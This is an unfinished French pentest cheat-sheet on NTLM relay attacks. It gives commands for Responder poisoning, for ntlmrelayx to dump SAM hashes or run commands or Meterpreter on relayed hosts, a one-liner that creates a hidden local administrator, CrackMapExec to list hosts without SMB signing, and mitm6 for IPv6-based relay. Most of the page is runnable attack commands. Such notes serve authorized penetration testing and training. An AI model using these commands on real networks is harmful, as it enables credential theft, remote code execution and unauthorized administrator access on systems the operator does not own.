---
description: A finir
---

# NTLM Relay

Prendre la dernière version de Responder ([https://github.com/lgandx/Responder](https://github.com/lgandx/Responder))

### Ecoute passive

```
sudo python3 responder -I eth0
```

Les _hashs_ NT utilisé dans la version 1 et 2 du protocole NTLM (a.k.a Net-NTLMv1-SSP et Net-NTLMv2-SSP) peuvent être relayés.

### Relayer

Pour pouvoir relayer, il faut que les services SMB et HTTP de Responder soit stoppés (fichier de configuration Responder.conf). Ceci permet le bon fonctionnement de `ntlmrelayx`.

_**Note :** les deux scripts doivent être exécutés dans le même contexte, pas dans 2 conteneurs Docker différents._

```
# Terminal 1 (dans le docker impacket)
Dumper la base SAM : ntlmrelayx -tf <TARGETS.txt>
Exécuter une commande : ntlmrelayx -tf <TARGETS.txt> -c <COMMANDE ou METERPRETER>

# Terminal 2
sudo python3 responder -I eth0 -d -w # Les hashs sont visibles dans Responder/logs/Responder-Session.log
```

#### TIPS

* `-smb2support` : Option qui permet de supporter le protocole SMBv2
* `-i` : Option pour exécuter des commandes de manière interactive
* `-c "net user user pass /add && net localgroup Administrators user /add"` : Ajoute un administrateur local

Le fichier `TARGETS.txt` contient les IP des machines dont la signature SMB n'est pas activée. Cette liste de machine peut être récupérée avec la commande suivante :&#x20;

```
cme smb <IP>/<MASK> --gen-relay-list <TARGETS.txt>
```

### IPv6

Prendre la dernière version de `mitm6` ([https://github.com/dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)). Après l'installation, en cas d'erreur `matplotlib`, exécuter la commande suivante :&#x20;

```
sudo pip install --upgrade matplotlib
```

Pour relayer les commandes sont les suivantes :&#x20;

```
# Terminal 1 (dans le docker impacket)
ntlmrelayx.py -6 -tf <TARGETS.txt>

# Terminal 2 
sudo mitm6 -d <DOMAIN.LOCAL>
```
